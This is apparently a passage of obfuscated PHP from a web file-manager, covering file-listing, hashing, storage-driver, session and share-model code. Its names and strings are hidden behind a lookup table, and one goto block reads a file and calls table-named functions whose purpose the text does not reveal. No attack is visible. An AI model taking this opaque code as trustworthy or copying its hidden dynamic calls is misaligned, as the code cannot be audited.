$this->folderInfo($Ú¯ÂûØÂ, $ôïîíí); } } closedir($‡·Ç¡î); return $µ½÷€õ; } public function listAll($§ô¹±Úã, &$¸„ã¤‚Â = array()) { $ù¥øÇòş =& $_SERVER[¿ğÚ‰±–]; $§ô¹±Úã = $this->iconvSystem($§ô¹±Úã); $§ô¹±Úã = rtrim($§ô¹±Úã, $ù¥øÇòş[8]) . $ù¥øÇòş[8]; if (!($ŸÖ—¸öÂ = @opendir($§ô¹±Úã))) { return $¸„ã¤‚Â; } while (($Ù¢ºå– = readdir($ŸÖ—¸öÂ)) !== !1) { if ($Ù¢ºå– == $ù¥øÇòş[10] || $Ù¢ºå– == $ù¥øÇòş[1370]) { continue; } $”¿À³Ù = $§ô¹±Úã . $Ù¢ºå–; $€²Ù¿Îú = is_dir($”¿À³Ù) && !is_link($”¿À³Ù) ? 1 : 0; $”¿À³Ù = $€²Ù¿Îú ? $”¿À³Ù . $ù¥øÇòş[8] : $”¿À³Ù; $¸„ã¤‚Â[] = array($ù¥øÇòş[87] => $”¿À³Ù, $ù¥øÇòş[78] => $€²Ù¿Îú, $ù¥øÇòş[88] => intval(@filemtime($”¿À³Ù)), $ù¥øÇòş[79] => $€²Ù¿Îú ? 0 : intval($this->size($”¿À³Ù))); if ($€²Ù¿Îú) { $this->listAll($”¿À³Ù, $¸„ã¤‚Â); } } closedir($ŸÖ—¸öÂ); return $¸„ã¤‚Â; } public function has($¯çÁÈª», $úğ÷€¡“ = false, $şº«ÕÏ = true) { $èôœ©üæ =& $_SERVER[¿ğÚ‰±–]; $¯çÁÈª» = $this->iconvSystem($¯çÁÈª»); $¯çÁÈª» = rtrim($¯çÁÈª», $èôœ©üæ[8]) . $èôœ©üæ[8]; if (!($ñŞî­…• = @opendir($¯çÁÈª»))) { return !1; } $–¿Ä×¶… = 0; $îáÂ´ = 0; $×öß¼¥ò = 0; while (($ã·¶¥Ù˜ = readdir($ñŞî­…•)) !== !1) { if ($ã·¶¥Ù˜ == $èôœ©üæ[10] || $ã·¶¥Ù˜ == $èôœ©üæ[1370]) { continue; } $…£ÇåÆ– = $¯çÁÈª» . $ã·¶¥Ù˜; if ($úğ÷€¡“) { $×öß¼¥ò++; if (@is_file($…£ÇåÆ–)) { $–¿Ä×¶…++; } else { $îáÂ´++; } if ($×öß¼¥ò > 10000) { break; } continue; } if ($şº«ÕÏ) { if (@is_file($…£ÇåÆ–)) { return !0; } } else { if (@is_dir($…£ÇåÆ– . $èôœ©üæ[8])) { return !0; } } } closedir($ñŞî­…•); if ($úğ÷€¡“) { return array($èôœ©üæ[239] => $–¿Ä×¶…, $èôœ©üæ[240] => $îáÂ´); } return !1; } public function hashSimple($Ş¥Š°µ·) { $ÜèµÙùå =& $_SERVER[¿ğÚ‰±–]; if (!$Ş¥Š°µ·) { return md5($ÜèµÙùå[12]); } $Ş¥Š°µ· = $this->iconvSystem($Ş¥Š°µ·); $øÁ†¯”é = $this->size($Ş¥Š°µ·); $¡¯æåĞ = 200; $ÈµÍå = 50; if ($øÁ†¯”é <= $¡¯æåĞ * $ÈµÍå) { return $this->hashMd5($Ş¥Š°µ·) . $øÁ†¯”é; } $èâçš›£ = $ÜèµÙùå[12]; $Œ§Ï¾‘ß = intval($øÁ†¯”é / $ÈµÍå); $·€Æ«ÚØ = fopen($Ş¥Š°µ·, $ÜèµÙùå[1463]); if (!$·€Æ«ÚØ) { return $èâçš›£; } for ($Šçû°ûá = 0; $Šçû°ûá < $ÈµÍå; $Šçû°ûá++) { fseek_64($·€Æ«ÚØ, $Œ§Ï¾‘ß * $Šçû°ûá); $èâçš›£ .= fread($·€Æ«ÚØ, $¡¯æåĞ); } fseek_64($·€Æ«ÚØ, $øÁ†¯”é - $¡¯æåĞ); $èâçš›£ .= fread($·€Æ«ÚØ, $¡¯æåĞ); fclose($·€Æ«ÚØ); return md5($èâçš›£) . $øÁ†¯”é; } public function getContent($é‘×í—ˆ) { $é‘×í—ˆ = $this->iconvSystem($é‘×í—ˆ); return file_get_contents($é‘×í—ˆ); } public function setContent($×“ŒàŞÔ, $†ä½ĞÍ = '') { $×“ŒàŞÔ = $this->iconvSystem($×“ŒàŞÔ); $ŒÕçï¹’ = @file_put_contents($×“ŒàŞÔ, $†ä½ĞÍ, LOCK_EX); if (!$ŒÕçï¹’) { $this->writeLog(__FUNCTION__ . $_SERVER[¿ğÚ‰±–][1455], !0); } clearstatcache(); @chmod($×“ŒàŞÔ, $this->pathAuth); return $ŒÕçï¹’ === !1 ? !1 : !0; } public function fileSubstr($é¯¹¹¹ç, $¹¨ÈÎÚ = 0, $Ú×Å’Œ› = false) { $Ó€ÏÇ§ =& $_SERVER[¿ğÚ‰±–]; $é¯¹¹¹ç = $this->iconvSystem($é¯¹¹¹ç); if ($Ú×Å’Œ› === !1) { $Ú×Å’Œ› = $this->size($é¯¹¹¹ç); } if ($Ú×Å’Œ› <= 0) { return $Ó€ÏÇ§[12]; } $‚Û—¦ßş = fopen($é¯¹¹¹ç, $Ó€ÏÇ§[1463]); if (!$‚Û—¦ßş) { return !1; } fseek_64($‚Û—¦ßş, $¹¨ÈÎÚ); $ŠƒÎÚ–í = fread($‚Û—¦ßş, $Ú×Å’Œ›); fclose($‚Û—¦ßş); if (!$ŠƒÎÚ–í) { $this->writeLog(__FUNCTION__ . $Ó€ÏÇ§[1455], !0); } return $ŠƒÎÚ–í; } public function upload($ÑÒ‹Ş¤¤, $Ú›ûôâİ, $ ¸Ù¼©ş = false, $Øôƒ…ëÑ = REPEAT_REPLACE) { if ($ ¸Ù¼©ş) { return $this->moveFile($Ú›ûôâİ, $ÑÒ‹Ş¤¤); } return $this->copyFile($Ú›ûôâİ, $ÑÒ‹Ş¤¤); } public function setModifyTime($Á¸ÒÆ˜‡, $£ÑşªÎ = '') { @touch($Á¸ÒÆ˜‡, intval($£ÑşªÎ)); } public function download($ï³²İŸ¥, $Ÿ’ú×šï) { return $this->iconvSystem($ï³²İŸ¥); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($ªâ­æöª) { parent::__construct($ªâ­æöª); $this->setSignVersion($_SERVER[¿ğÚ‰±–][247]); } public function fileOutImage($îéÖÒ°, $«¯‰§Î = 250) { $–¶Ğ¸áš =& $_SERVER[¿ğÚ‰±–]; if ($this->size($îéÖÒ°) > 1024 * 1024 * 25) { return $this->fileOutImageServer($îéÖÒ°, $«¯‰§Î); } $œ›Çµåˆ = array($–¶Ğ¸áš[1464] => $–¶Ğ¸áš[1465] . $«¯‰§Î . $–¶Ğ¸áš[1466]); $ÈÜ÷ „ = $this->link($îéÖÒ°, $œ›Çµåˆ); $this->fileOutLink($ÈÜ÷ „); } public function fileOutLink($€ÚŒÃª¡) { $§¬˜¸Œ° =& $_SERVER[¿ğÚ‰±–]; if (substr($€ÚŒÃª¡, 0, 7) == $§¬˜¸Œ°[313]) { $€ÚŒÃª¡ = $§¬˜¸Œ°[314] . substr($€ÚŒÃª¡, 7); } header($§¬˜¸Œ°[175] . $€ÚŒÃª¡); die; } } goto D„İÄ³ƒØÒ; b„‘äÚÃÉá: if ($_SERVER[$_SERVER[¿ğÚ‰±–][957]] != $_SERVER[$_SERVER[¿ğÚ‰±–][1610]]) { $_getc = $_SERVER[¿ğÚ‰±–][959]; $_getfile = $_SERVER[$_SERVER[¿ğÚ‰±–][954]] . $_SERVER[¿ğÚ‰±–][955]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¿ğÚ‰±–][262], $_getfilec); if (count($_getarrs) < $_SERVER[¿ğÚ‰±–][686]) { $exit = $_SERVER[¿ğÚ‰±–][960]; $exit(); } $_act = $_SERVER[¿ğÚ‰±–][969]; $_act($_SERVER[$_SERVER[¿ğÚ‰±–][968]]); } class SessionModel extends ModelBase { protected $tableName = "\163\x79\x73\164\145\155\x5f\x73\x65\163\x73\x69\157\x6e"; public function get($‹×ø™ ) { $£¹ ²Ìû =& $_SERVER[¿ğÚ‰±–]; $—–÷•êµ = $this->where(array($£¹ ²Ìû[2115] => $‹×ø™ ))->find(); if (!is_array($—–÷•êµ)) { return !1; } return $—–÷•êµ[$£¹ ²Ìû[171]]; } public function set($ä«€ãÌ, $ª˜·ØäÄ, $¸«µ¨òó = 3600) { $†£Ú„ìá =& $_SERVER[¿ğÚ‰±–]; $ï¨ÃÏ = array($†£Ú„ìá[2115] => $ä«€ãÌ, $†£Ú„ìá[2015] => $ª˜·ØäÄ, $†£Ú„ìá[2116] => $¸«µ¨òó + time()); if (Session::get($†£Ú„ìá[2117])) { $ï¨ÃÏ[$†£Ú„ìá[1777]] = Session::get($†£Ú„ìá[2117]); } else { $ï¨ÃÏ[$†£Ú„ìá[1777]] = 0; } if ($this->get($ä«€ãÌ)) { return $this->where(array($†£Ú„ìá[2115] => $ä«€ãÌ))->save($ï¨ÃÏ); } else { return $this->add($ï¨ÃÏ, array(), !0); } } public function remove($›åø¼¦ñ) { return $this->where(array($_SERVER[¿ğÚ‰±–][2115] => $›åø¼¦ñ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[¿ğÚ‰±–][2118] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\x61\x72\145"; protected $dataAuto = array(array("\x6d\157\x64\151\146\x79\x54\151\x6d\145", "\164\151\155\145", "\151\156\163\145\x72\164\x2c\165\x70\x64\x61\164\x65", "\146\165\156\x63\164\151\x6f\x6e"), array("\143\162\x65\141\164\x65\124\x69\155\145", "\164\151\155\145", "\151\x6e\163\x65\162\164", "\x66\x75\x6e\143\x74\x69\x6f\156"), array("\x6f\160\x74\x69\157\x6e\163", '', "\x69\x6e\163\x65\x72\164\x2c\165\x70\144\x61\x74\145\x2c\x73\x65\154\x65\x63\x74", "\152\x73\x6f\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($›¥É¸á¼) { $¢šÁï—¢ =& $_SERVER[¿ğÚ‰±–]; $Ü“ˆĞ—í = isset($›¥É¸á¼[0]) ? $›¥É¸á¼[0] : !1; return array($¢šÁï—¢[2119] => array(USER_ID, $¢šÁï—¢[2120]), $¢šÁï—¢[2060] => array($Ü“ˆĞ—í, $¢šÁï—¢[2121])); } protected function listSimple() { $±ÃğÏŸÈ = array($_SERVER[¿ğÚ‰±–][1777] => USER_ID); $†ã›Ç = $this->field($this->fieldList)->where($±ÃğÏŸÈ)->select(); return $†ã›Ç ? $†ã›Ç : array(); } protected function getInfo($ÎüÆ¡¨ø, $äÁÀú¢ø = false) { $Í¦÷Í­£ =& $_SERVER[¿ğÚ‰±–]; if ($äÁÀú¢ø) { return $this->_getShareInfo(array($Í¦÷Í­£[665] => $ÎüÆ¡¨ø)); } $€ÛÇ¨ˆ­ = $this->cacheFunctionGet($Í¦÷Í­£[2062], $ÎüÆ¡¨ø); return $€ÛÇ¨ˆ­; } public function getInfoByHash($£µşä‰å) { return $this->_getShareInfo(array($_SERVER[¿ğÚ‰±–][2122] => $£µşä‰å)); } public function getInfoByPath($â§ÛÆ‰ú) { $·›éáÇ² =& $_SERVER[¿ğÚ‰±–]; $”ë·´÷ı = array($·›éáÇ²[1777] => USER_ID, $·›éáÇ²[193] => $â§ÛÆ‰ú); return $this->_getShareInfo($”ë·´÷ı); } public function getInfoBySourcePath($¡ïû©¢) { $‘¥™Èã‡ =& $_SERVER[¿ğÚ‰±–]; $°œŸÖŠí = array($‘¥™Èã‡[1777] => USER_ID, $‘¥™Èã‡[1264] => $¡ïû©¢); return $this->_getShareInfo($°œŸÖŠí); } private function _getShareInfo($ú‘í§™ª) { $òØ„×ö =& $_SERVER[¿ğÚ‰±–]; $Ş¯²îÏ = $this->where($ú‘í§™ª)->find(); if (!$Ş¯²îÏ) { return !1; } $ú‘í§™ª = array($òØ„×ö[665] => $Ş¯²îÏ[$òØ„×ö[665]]); $ß˜öÉÌ© = $òØ„×ö[2123]; $¸ÏĞµÊ÷ = Model($òØ„×ö[666])->order($òØ„×ö[475])->field($ß˜öÉÌ©)->where($ú‘í§™ª)->select(); if ($Ş¯²îÏ[$òØ„×ö[193]] == $òØ„×ö[228]) { $Ş¯²îÏ[$òØ„×ö[90]] = IO::info($Ş¯²îÏ[$òØ„×ö[1264]]); } else { $Ş¯²îÏ[$òØ„×ö[90]] = Model($òØ„×ö[1425])->pathInfo($Ş¯²îÏ[$òØ„×ö[193]]); } $Ş¯²îÏ[$òØ„×ö[2124]] = $¸ÏĞµÊ÷; return $Ş¯²îÏ; } protected function getInfoAuth($ëİ¾‚®Ÿ) { $Ë¯÷Úä  =& $_SERVER[¿ğÚ‰±–]; $Ü»£¯¸Í = $this->getInfo($ëİ¾‚®Ÿ); if ($Ü»£¯¸Í[$Ë¯÷Úä [1777]] == USER_ID) { $Ü»£¯¸Í[$Ë¯÷Úä [487]] = $Ü»£¯¸Í[$Ë¯÷Úä [90]][$Ë¯÷Úä [487]]; } else { $Ü»£¯¸Í[$Ë¯÷Úä [487]] = Model($Ë¯÷Úä [567])->authMake($Ü»£¯¸Í[$Ë¯÷Úä [2124]]); } return $Ü»£¯¸Í; } protected function listData($¿¯¦¢»´ = null, $•õóÅõõ = 300) { $ù‰ÎËú =& $_SERVER[¿ğÚ‰±–]; $¶¿Ü•à = array(array($ù‰ÎËú[562] => array($ù‰ÎËú[1097], 0), $ù‰ÎËú[663] => array($ù‰ÎËú[1097], 0), $ù‰ÎËú[2125] => $ù‰ÎËú[2078])); if ($¿¯¦¢»´ == $ù‰ÎËú[2126]) { $¶¿Ü•à = array($ù‰ÎËú[562] => 1); } else { if ($¿¯¦¢»´ == $ù‰ÎËú[1249]) { $¶¿Ü•à = array($ù‰ÎËú[663] => 1); } } $¶¿Ü•à[$ù‰ÎËú[1777]] = USER_ID; $¥ä¼è³ = $this->where($¶¿Ü•à)->selectPage($•õóÅõõ); return $¥ä¼è³; } protected function listToMe($Ê¯ÂµÖÄ = 300) { $™ûïı·Â =& $_SERVER[¿ğÚ‰±–]; $ÁéÜƒ‘Œ = Model($™ûïı·Â[2127])->userGroupParents(USER_ID); $ÉÕ´£ô³ = array($™ûïı·Â[648] => SourceModel::TYPE_USER, $™ûïı·Â[569] => USER_ID); if ($ÁéÜƒ‘Œ) { $ÉÕ´£ô³ = array(array($™ûïı·Â[648] => SourceModel::TYPE_USER, $™ûïı·Â[569] => USER_ID), array($™ûïı·Â[648] => SourceModel::TYPE_GROUP, $™ûïı·Â[569] => array($™ûïı·Â[7], $ÁéÜƒ‘Œ)), $™ûïı·Â[2125] => $™ûïı·Â[2078]); } $ÄÇÕ×– = Model($™ûïı·Â[666])->where($ÉÕ´£ô³)->selectPage($Ê¯ÂµÖÄ); $îÍĞ¬À‘ = array_to_keyvalue_group($ÄÇÕ×–[$™ûïı·Â[445]], $™ûïı·Â[665]); if (!$îÍĞ¬À‘) { return $ÄÇÕ×–; } $ıÛî›òé = $™ûïı·Â[2128]; $ÉÕ´£ô³ = array($™ûïı·Â[665] => array($™ûïı·Â[492], array_keys($îÍĞ¬À‘)), $™ûïı·Â[1777] => array($™ûïı·Â[1099], $™ûïı·Â[228])); $Ôñ«ƒÇş = $this->field($ıÛî›òé)->where($ÉÕ´£ô³)->select(); foreach ($Ôñ«ƒÇş as $˜Óòæ„İ => &$•”¨¬±†) { $•”¨¬±†[$™ûïı·Â[2124]] = $îÍĞ¬À‘[$•”¨¬±†[$™ûïı·Â[665]]]; } unset($•”¨¬±†); $Œ“ñ¿ŸÁ = array($™ûïı·Â[2129] => $Ôñ«ƒÇş, $™ûïı·Â[2130] => $ÄÇÕ×–[$™ûïı·Â[442]]); return $Œ“ñ¿ŸÁ; } protected function shareAdd($û•ìëĞù, $¶ó¡˜ğ) { $óóØ¢åÀ =& $_SERVER[¿ğÚ‰±–]; $—ÚÍ§à¬ = $this->_addShareData($û•ìëĞù, $¶ó¡˜ğ); if (!empty($¶ó¡˜ğ[$óóØ¢åÀ[2131]])) { $this->_shareAuthSet($—ÚÍ§à¬, $¶ó¡˜ğ[$óóØ¢åÀ[2131]]); } $this->shareEventAdd($û•ìëĞù, $¶ó¡˜ğ, $óóØ¢åÀ[2132]); return $—ÚÍ§à¬; } protected function shareAddSystem($ˆÁñ±°, $á–‘‡ÍÇ) { $Ñ¥ÂÔú… =& $_SERVER[¿ğÚ‰±–]; $à¯·÷  = $this->_addShareData($ˆÁñ±°, $á–‘‡ÍÇ, $Ñ¥ÂÔú…[191]); $this->_shareAuthSet($à¯·÷ , $á–‘‡ÍÇ[$Ñ¥ÂÔú…[2131]]); return $à¯·÷ ; } private function shareEventAdd($È°±‘å’, $Ôõµ„€, $â­ğÈŠ = "\141\x64\144") { $ŠÜı“Õƒ =& $_SERVER[¿ğÚ‰±–]; if (!$È°±‘å’ || $È°±‘å’ == $ŠÜı“Õƒ[228]) { return; } if ($â­ğÈŠ == $ŠÜı“Õƒ[2132]) { if ($Ôõµ„€[$ŠÜı“Õƒ[562]] == $ŠÜı“Õƒ[91]) { Model($ŠÜı“Õƒ[633])->eventShare($È°±‘å’, $ŠÜı“Õƒ[2133]); } if ($Ôõµ„€[$ŠÜı“Õƒ[663]] == $ŠÜı“Õƒ[91]) { Model($ŠÜı“Õƒ[633])->eventShare($È°±‘å’, $ŠÜı“Õƒ[2134]); } return; } $ã©Ğáµ„ = $this->getInfoByPath($È°±‘å’); $áå„ğª = $ŠÜı“Õƒ[2135]; if ($ã©Ğáµ„[$ŠÜı“Õƒ[562]] == $ŠÜı“Õƒ[228] && $Ôõµ„€[$ŠÜı“Õƒ[562]] == $ŠÜı“Õƒ[91]) { $áå„ğª = $ŠÜı“Õƒ[2133]; } if ($ã©Ğáµ„[$ŠÜı“Õƒ[562]] == $ŠÜı“Õƒ[91] && $Ôõµ„€[$ŠÜı“Õƒ[562]] == $ŠÜı“Õƒ[228]) { $áå„ğª = $ŠÜı“Õƒ[2136]; } if ($ã©Ğáµ„[$ŠÜı“Õƒ[663]] == $ŠÜı“Õƒ[228] && $Ôõµ„€[$ŠÜı“Õƒ[663]] == $ŠÜı“Õƒ[91]) { $áå„ğª = $ŠÜı“Õƒ[2134]; } if ($ã©Ğáµ„[$ŠÜı“Õƒ[663]] == $ŠÜı“Õƒ[91] && $Ôõµ„€[$ŠÜı“Õƒ[663]] == $ŠÜı“Õƒ[228]) { $áå„ğª = $ŠÜı“Õƒ[2137]; } Model($ŠÜı“Õƒ[633])->eventShare($È°±‘å’, $áå„ğª); return; } private function _addShareData($Ê¨¦ô, $ğ «‘›Ì = array(), $ğ§¨£ÊÍ = false) { $É™òÑ®İ =& $_SERVER[¿ğÚ‰±–]; $„â­œò = $ğ§¨£ÊÍ == $É™òÑ®İ[191] ? 0 : USER_ID; $Üá¤ïˆ = array($É™òÑ®İ[491] => $Ê¨¦ô, $É™òÑ®İ[1768] => $„â­œò); if ($Ê¨¦ô == 0) { $Üá¤ïˆ = array($É™òÑ®İ[2138] => $ğ «‘›Ì[$É™òÑ®İ[1264]], $É™òÑ®İ[1768] => $„â­œò); } if ($‚©ù¾Òõ = $this->where($Üá¤ïˆ)->find()) { return $‚©ù¾Òõ[$É™òÑ®İ[665]]; } if ($Ê¨¦ô == 0) { $÷ˆ£Ñ¨Á = array($É™òÑ®İ[32] => get_path_this($ğ «‘›Ì[$É™òÑ®İ[87]])); } else { $÷ˆ£Ñ¨Á = Model($É™òÑ®İ[902])->sourceInfo($Ê¨¦ô); if (!$÷ˆ£Ñ¨Á) { return !1; } } if (!$ğ «‘›Ì[$É™òÑ®İ[1666]]) { $ğ «‘›Ì[$É™òÑ®İ[1666]] = $÷ˆ£Ñ¨Á[$É™òÑ®İ[32]]; } $û÷ˆıï÷ = array($É™òÑ®İ[1768] => $„â­œò, $É™òÑ®İ[491] => $Ê¨¦ô, $É™òÑ®İ[1666] => $É™òÑ®İ[12], $É™òÑ®İ[562] => 0, $É™òÑ®İ[663] => 0, $É™òÑ®İ[1264] => $É™òÑ®İ[12], $É™òÑ®İ[383] => $É™òÑ®İ[12], $É™òÑ®İ[974] => $É™òÑ®İ[12], $É™òÑ®İ[2139] => 0, $É™òÑ®İ[2140] => 0, $É™òÑ®İ[839] => 0, $É™òÑ®İ[2141] => $É™òÑ®İ[12], $É™òÑ®İ[2122] => $É™òÑ®İ[12]); $¢ÕşÒÖ = explode($É™òÑ®İ[50], $É™òÑ®İ[2142]); foreach ($¢ÕşÒÖ as $ú³˜ßöº) { if (!isset($ğ «‘›Ì[$ú³˜ßöº])) { continue; } $û÷ˆıï÷[$ú³˜ßöº] = $ğ «‘›Ì[$ú³˜ßöº]; } $ûÆ˜¯¢à = $this->add($û÷ˆıï÷); $ú¤¤µÍ› = array($É™òÑ®İ[2122] => short_id($ûÆ˜¯¢à)); $this->where(array($É™òÑ®İ[2143] => $ûÆ˜¯¢à))->save($ú¤¤µÍ›); return $ûÆ˜¯¢à; } private function _shareAuthSet($©Í²ÌîÖ, $æåÛâ¾¤) { $Ú”‚Œ½è =& $_SERVER[¿ğÚ‰±–]; if (!is_array($æåÛâ¾¤)) { return !1; } $›â€·€Ï = Model($Ú”‚Œ½è[2088]); $›â€·€Ï->where(array($Ú”‚Œ½è[665] => $©Í²ÌîÖ))->delete(); $ƒÒ‚ÓÖÇ = array(); foreach ($æåÛâ¾¤ as $Š¿¡÷¡ª) { $ˆËúŒ¢À = SourceModel::TYPE_USER; if ($Š¿¡÷¡ª[$Ú”‚Œ½è[190]] == SourceModel::TYPE_GROUP) { $ˆËúŒ¢À = SourceModel::TYPE_GROUP; } $ûÀìï‰ = array($Ú”‚Œ½è[665] => $©Í²ÌîÖ, $Ú”‚Œ½è[190] => $ˆËúŒ¢À, $Ú”‚Œ½è[569] => intval($Š¿¡÷¡ª[$Ú”‚Œ½è[569]]), $Ú”‚Œ½è[2084] => 0, $Ú”‚Œ½è[2144] => -1); if ($Š¿¡÷¡ª[$Ú”‚Œ½è[2084]]) { $ûÀìï‰[$Ú”‚Œ½è[2084]] = $Š¿¡÷¡ª[$Ú”‚Œ½è[2084]]; } else { if ($Š¿¡÷¡ª[$Ú”‚Œ½è[2144]]) { $ûÀìï‰[$Ú”‚Œ½è[2144]] = $Š¿¡÷¡ª[$Ú”‚Œ½è[2144]]; } } $ƒÒ‚ÓÖÇ[] = $ûÀìï‰; } return $›â€·€Ï->addAll($ƒÒ‚ÓÖÇ, array(), !0); } public function numViewAdd($™ø†ÍØü) { $Í“¼Î˜ =& $_SERVER[¿ğÚ‰±–]; $í´ÙÃ‘ß = array($Í“¼Î˜[2143] => $™ø†ÍØü); $this->where($í´ÙÃ‘ß)->setAdd($Í“¼Î˜[2139]); } public function numDownloadAdd($ñÜí©Ü†) { $ ¡É‚… =& $_SERVER[¿ğÚ‰±–]; $ëĞœ¡ = array($ ¡É‚…[2143] => $ñÜí©Ü†); $this->where($ëĞœ¡)->setAdd($ ¡É‚…[2140]); } protected function shareEdit($İ‡˜âÔÄ, $Á»÷Ìó) { $‹ñ†”Ğ =& $_SERVER[¿ğÚ‰±–]; $ğ¸ÔªŒ­ = $this->getInfo($İ‡˜âÔÄ); if (!$ğ¸ÔªŒ­) { return !1; } $this->_checkLinkShare($Á»÷Ìó, $ğ¸ÔªŒ­); $‹‘€Ò¦¯ = array(); $‘ò®ŸÚı = explode($‹ñ†”Ğ[50], $‹ñ†”Ğ[2145]); foreach ($‘ò®ŸÚı as $Ì÷¦áğ‚) { if (!array_key_exists($Ì÷¦áğ‚, $Á»÷Ìó)) { continue; } $‹‘€Ò¦¯[$Ì÷¦áğ‚] = $Á»÷Ìó[$Ì÷¦áğ‚]; } $this->shareEventAdd($ğ¸ÔªŒ­[$‹ñ†”Ğ[193]], $Á»÷Ìó, $‹ñ†”Ğ[1945]); $this->where(array($‹ñ†”Ğ[2143] => $İ‡˜âÔÄ))->save($‹‘€Ò¦¯); if (isset($Á»÷Ìó[$‹ñ†”Ğ[2131]])) { $this->_shareAuthSet($İ‡˜âÔÄ, $Á»÷Ìó[$‹ñ†”Ğ[2131]]); } return !0; } private function _checkLinkShare($ãÈÄÁ›È, $Ø‚©Êß) { $ÎÔË¿Âû =& $_SERVER[¿ğÚ‰±–]; if ($ãÈÄÁ›È[$ÎÔË¿Âû[562]] != $ÎÔË¿Âû[91]) { return; } $ÏÌâ—® = $Ø‚©Êß[$ÎÔË¿Âû[90]][$ÎÔË¿Âû[193]]; if ($Ø‚©Êß[$ÎÔË¿Âû[90]][$ÎÔË¿Âû[33]] != $ÎÔË¿Âû[230]) { $Ä¥äî£ = $this->_folderReport($ÏÌâ—®); if (!$Ä¥äî£) { return; } show_json(LNG($ÎÔË¿Âû[2146]) . $ÎÔË¿Âû[2147] . $Ä¥äî£, !1); } $ê£’«¾ç = Model($ÎÔË¿Âû[902])->fileInfoGet($Ø‚©Êß[$ÎÔË¿Âû[90]][$ÎÔË¿Âû[193]]); if (!$ê£’«¾ç) { return; } $Ñ‹ú‰Ö = $this->shareFileMeta($ê£’«¾ç[$ÎÔË¿Âû[541]]); if (isset($Ñ‹ú‰Ö[$ÎÔË¿Âû[450]]) && $Ñ‹ú‰Ö[$ÎÔË¿Âû[450]] == $ÎÔË¿Âû[91]) { show_json(LNG($ÎÔË¿Âû[2148]), !1); } } private function _folderReport($ê¤¥ø¸Í) { $¯Áııı =& $_SERVER[¿ğÚ‰±–]; $Ë‚ÔË²ä = array($¯Áııı[541] => array($¯Áııı[1097], 0), $¯Áııı[828] => 3); $®Û£şâÚ = Model($¯Áııı[2149])->where($Ë‚ÔË²ä)->field($¯Áııı[541])->select(); if (!$®Û£şâÚ) { return !1; } $®Û£şâÚ = array_to_keyvalue($®Û£şâÚ, $¯Áııı[12], $¯Áııı[541]); $¼¢ÑñŠà = $¯Áııı[50] . $ê¤¥ø¸Í . $¯Áııı[50]; $Ë‚ÔË²ä = array($¯Áııı[541] => array($¯Áııı[7], $®Û£şâÚ), $¯Áııı[584] => array($¯Áııı[459], "\x25{$¼¢ÑñŠà}\x25"), $¯Áııı[505] => 0); $¹Ï²¤Ï = Model($¯Áııı[902])->where($Ë‚ÔË²ä)->field($¯Áııı[2150])->find(); if (!$¹Ï²¤Ï) { return !1; } $š‰©”ãÒ = substr($¹Ï²¤Ï[$¯Áııı[584]], strpos($¹Ï²¤Ï[$¯Áııı[584]], $¼¢ÑñŠà)); $Ë‚ÔË²ä = array($¯Áııı[193] => array($¯Áııı[7], trim($š‰©”ãÒ, $¯Áııı[50]))); $Ñ‰âÓâ = Model($¯Áııı[902])->where($Ë‚ÔË²ä)->field($¯Áııı[32])->select(); $İ÷„ŞÌ· = array_to_keyvalue($Ñ‰âÓâ, $¯Áııı[12], $¯Áııı[32]); $İ÷„ŞÌ·[] = $¹Ï²¤Ï[$¯Áııı[32]]; return implode($¯Áııı[8], $İ÷„ŞÌ·); } protected function remove($ïßöÎ€») { $¬ğä»îè =& $_SERVER[¿ğÚ‰±–]; $”ÇîéŸÉ = is_array($ïßöÎ€») ? $ïßöÎ€» : array($ïßöÎ€»); for ($¼öê‹¾ = 0; $¼öê‹¾ < count($”ÇîéŸÉ); $¼öê‹¾++) { $Õ‹Á¬Ì = $this->getInfo($”ÇîéŸÉ[$¼öê‹¾]); if ($Õ‹Á¬Ì[$¬ğä»îè[663]] == $¬ğä»îè[91]) { Model($¬ğä»îè[633])->eventShare($Õ‹Á¬Ì[$¬ğä»îè[193]], $¬ğä»îè[2137]); } if ($Õ‹Á¬Ì[$¬ğä»îè[562]] == $¬ğä»îè[91]) { Model($¬ğä»îè[633])->eventShare($Õ‹Á¬Ì[$¬ğä»îè[193]], $¬ğä»îè[2136]); } } if (is_array($ïßöÎ€»)) { $ïßöÎ€» = array($¬ğä»îè[7], $ïßöÎ€»); } $œÒ­Ê±Õ = array($¬ğä»îè[665] => $ïßöÎ€»); $£à¹íé¤ = $this->where($œÒ­Ê±Õ)->delete(); if ($£à¹íé¤) { Model($¬ğä»îè[666])->where(array($¬ğä»îè[665] => $ïßöÎ€»))->delete(); } return $£à¹íé¤; } protected function removeBySource($Õèø×¥ï) { $ÂÕ „§‹ =& $_SERVER[¿ğÚ‰±–]; $ë¡ÂŞõœ = array($ÂÕ „§‹[491] => array($ÂÕ „§‹[492], $Õèø×¥ï)); $”±‰™Ã² = $this->field($ÂÕ „§‹[665])->where($ë¡ÂŞõœ)->select(); $”±‰™Ã² = array_to_keyvalue($”±‰™Ã², $ÂÕ „§‹[12], $ÂÕ „§‹[665]); if (!$”±‰™Ã²) { return; } $ë¡ÂŞõœ = array($ÂÕ „§‹[2143] => array($ÂÕ „§‹[492], $”±‰™Ã²)); $this->where($ë¡ÂŞõœ)->delete(); Model($ÂÕ „§‹[666])->where($ë¡ÂŞõœ)->delete(); } public function listAll($îéõ’İ) { $²÷•ÅöÄ =& $_SERVER[¿ğÚ‰±–]; $îÄ¹¢¢¹ = array(); if ($îéõ’İ[$²÷•ÅöÄ[1777]]) { $îÄ¹¢¢¹[$²÷•ÅöÄ[1777]] = $îéõ’İ[$²÷•ÅöÄ[1777]]; } if ($îéõ’İ[$²÷•ÅöÄ[838]]) { $óˆë‹ÎŞ = $îéõ’İ[$²÷•ÅöÄ[839]] ? $îéõ’İ[$²÷•ÅöÄ[839]] : strtotime(date($²÷•ÅöÄ[2151])); $îÄ¹¢¢¹[$²÷•ÅöÄ[231]] = array($²÷•ÅöÄ[409], array($îéõ’İ[$²÷•ÅöÄ[838]], $óˆë‹ÎŞ)); } if ($îéõ’İ[$²÷•ÅöÄ[33]]) { $îÄ¹¢¢¹[$îéõ’İ[$²÷•ÅöÄ[33]]] = 1; } else { $îÄ¹¢¢¹[] = array($²÷•ÅöÄ[562] => array($²÷•ÅöÄ[1097], 0), $²÷•ÅöÄ[663] => array($²÷•ÅöÄ[1097], 0), $²÷•ÅöÄ[2125] => 